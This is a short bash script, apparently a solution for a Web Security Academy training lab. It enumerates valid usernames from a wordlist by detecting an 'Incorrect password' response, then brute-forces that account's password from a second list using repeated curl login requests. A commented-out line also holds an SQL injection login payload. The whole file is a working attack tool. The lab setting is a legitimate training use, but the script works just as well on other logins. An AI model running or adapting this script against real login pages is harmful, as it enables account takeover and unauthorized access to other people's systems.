#!/bin/bash
document=a.txt
start=1
URL="https://ac6c1fe31ecf1652c0401cc800020096.web-security-academy.net/login"
total=$(wc -l < $document)
while [[ $start -le $total ]]
    do
    test=$(awk "NR==$start{print $1}" $document)
#    curl -s -d "csrf=!284453q&username=administrator'--&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
    if [[ $(curl -s -d "username=$test&password=a" $URL | grep "Incorrect password") ]]
    then
        echo -e "username is $test"
        username=$test
        break 1
    fi
    ((start = start + 1))
#    echo $start
done


document=b.txt
start=1
total=$(wc -l < $document)
while [[ $start -le $total ]]
    do
    test=$(awk "NR==$start{print $1}" $document)
#    curl -s -d "username=$test&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
    if ! [[ $(curl -s -d "username=$username&password=$test" $URL | grep "Incorrect password") ]]
    then
        echo -e "password is $test"
        password=$test
        break 1
    fi
    ((start = start + 1))
done

